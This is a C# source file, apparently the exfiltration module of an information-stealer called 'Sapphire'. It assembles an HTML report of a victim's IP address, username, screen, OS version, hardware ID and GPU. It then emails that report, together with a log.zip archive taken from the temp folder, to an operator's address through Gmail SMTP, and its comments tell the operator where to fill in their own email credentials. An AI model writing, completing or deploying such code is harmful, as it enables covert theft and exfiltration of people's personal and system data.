using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using Sapphire.Modules.Information;

namespace Sapphire
{
    class SendLog
    {
        private static string text = $"<h2>------NEW LOGS------</h2>" + 
            $"<h3>{System.DateTime.Now}</h3> <br> <b>" + 
            $"IP: {UserInformation.ip} <br> <br>" + 
            $"Username: {UserInformation.pcname} <br> <br>" +
            $"Screen: {UserInformation.screen} <br> <br>" + 
            $"OS version: {UserInformation.OSVersion} <br> <br>" + 
            $"HWID: {UserInformation.GetHWID()} <br> <br>" +
            $"GPU: {UserInformation.GetGPUName()} <br> <br>";
        public static void Send()
        {
            string path = Path.GetTempPath() + "log.zip";
            if (File.Exists(path))
            {
                MailAddress from = new MailAddress("***", "sapphire"); // Your EMAIL
                MailAddress to = new MailAddress("***"); // EMAIL for get logs

                MailMessage msg = new MailMessage(from, to);

                msg.Subject = "Logs";
                msg.Body = text;
                msg.IsBodyHtml = true;
                msg.Attachments.Add(new Attachment(path));

                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
                smtp.Credentials = new NetworkCredential("***", "***"); // email and password the email address from which you will send the log
                smtp.EnableSsl = true;
                smtp.Send(msg);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[ERROR] does not exist archive");
                Console.ResetColor();
            }
        }
    }
}
